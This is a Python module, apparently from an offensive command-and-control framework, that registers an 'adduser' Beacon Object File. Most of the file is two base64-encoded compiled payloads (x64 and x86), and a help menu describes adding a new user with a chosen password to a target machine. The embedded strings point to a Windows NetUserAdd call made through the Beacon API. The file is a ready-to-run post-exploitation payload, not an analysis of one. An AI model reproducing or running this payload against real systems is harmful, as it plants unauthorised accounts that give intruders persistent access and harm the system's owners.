import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

# Session Management
from core.session_handlers import session_manager

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("adduser")
class AddUser(Bof):
	base64bof: str = "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"
	x86base64bof: str = "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AAAAAAAAAABbAAAAAAAAAAUAAAADARQAAAAAAAAAAAAAAAAAAAAAAAAAAABmAAAAAAAAAAYAAAADAVABAAAIAAAAAAAAAAAAAAAAAAAAAABwAAAABAAAAAIAAAACAF9vdXRwdXQACAAAAAIAAAACAF90cmFzaAAAAAAAAAIAAAACAAAAAACAAAAAAAAAAAAAAAACAAAAAACVAAAAAAAAAAAAAAACAAAAAACpAAAAAAAAAAAAAAACAAAAAAC8AAAAAAAAAAAAAAACAAAAAADdAAAAAAAAAAAAAAACAAAAAAD6AAAAAAAAAAAAAAACAAAAAAASAQAAAAAAAAAAAAACAAAAAAAuAQAAAAAAAAAAAAACAAAAAABVAQAAAAAAAAAAAAACAAAAAAB8AQAAAAAAAAAAAAACAAAAAACaAQAAAAAAAAAAAAACAAAAAACxAQAAAAAAAAAAAAACAAAAAADKAQAAAAAAAAAAAAACAN4BAAAucmRhdGEkenp6AC5laF9mcmFtZQBfYm9mc3RhcnQAX3ByaW50b3V0cHV0AF9pbnRlcm5hbF9wcmludGYAX1V0ZjE2VG9VdGY4AF9VdGY4VG9VdGYxNgAucmRhdGEkenp6AC5laF9mcmFtZQBfY3VycmVudG91dHNpemUAX19pbXBfX01TVkNSVCRjYWxsb2MAX19pbXBfX0JlYWNvbk91dHB1dABfX2ltcF9fTVNWQ1JUJGZyZWUAX19pbXBfX0tFUk5FTDMyJEdldFByb2Nlc3NIZWFwQDAAX19pbXBfX0tFUk5FTDMyJEhlYXBBbGxvY0AxMgBfX2ltcF9fTVNWQ1JUJHZzbnByaW50ZgBfX2ltcF9fS0VSTkVMMzIkSGVhcEZyZWVAMTIAX19pbXBfX0tFUk5FTDMyJFdpZGVDaGFyVG9NdWx0aUJ5dGVAMzIAX19pbXBfX0tFUk5FTDMyJE11bHRpQnl0ZVRvV2lkZUNoYXJAMjQAX19pbXBfX05FVEFQSTMyJE5ldFVzZXJBZGRAMTYAX19pbXBfX0JlYWNvbkRhdGFQYXJzZQBfX2ltcF9fQmVhY29uRGF0YUV4dHJhY3QAX19pbXBfX0JlYWNvblByaW50ZgA="

	def help_menu():
		menu = """
Add a new user to a machine
Usage: bofexec adduser -Z <USERNAME> -Z <PASSWORD> -Z <Optional: SERVER>
"""
		print(brightgreen + menu + reset)
		return